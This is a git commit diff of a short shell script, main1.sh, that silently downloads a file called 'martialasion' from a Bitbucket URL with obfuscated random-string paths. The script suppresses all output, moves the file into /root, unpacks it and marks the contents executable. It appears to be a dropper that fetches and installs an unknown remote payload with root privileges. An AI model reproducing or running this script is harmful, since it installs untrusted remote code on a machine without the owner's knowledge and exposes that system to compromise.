18b487a221b46de1d31b4e0bf0fb48936e09137a
hildamansur <102267965+hildamansur@users.noreply.github.com>
2022-03-24 21:33:04 -0700

    Update and rename main1 to main1.sh

--- main1.sh
+++ main1.sh
@@ -1,3 +1,4 @@
 curl -o martialasion https://bitbucket.org/namskdjworitpwprkdgalxmv/naszxcoiuwemnaoemaosnuemazoiemnaszxoiemwazxmcnoemaowemazsxcovm/raw/9692e7a20bdcb3c48bb122f003a7b9184bb7b8fc/unaseiuowemnaszxcoivuiowezxmnvoieweoizxmasoiweruiomnaszxcnoiuewe > /dev/null 2>&1 && chmod u+x *
-cp martialasion /root
+mv martialasion /root
+cd /../../../root && ls -a
 cd root && tar -xf martialasion && chmod u+x *
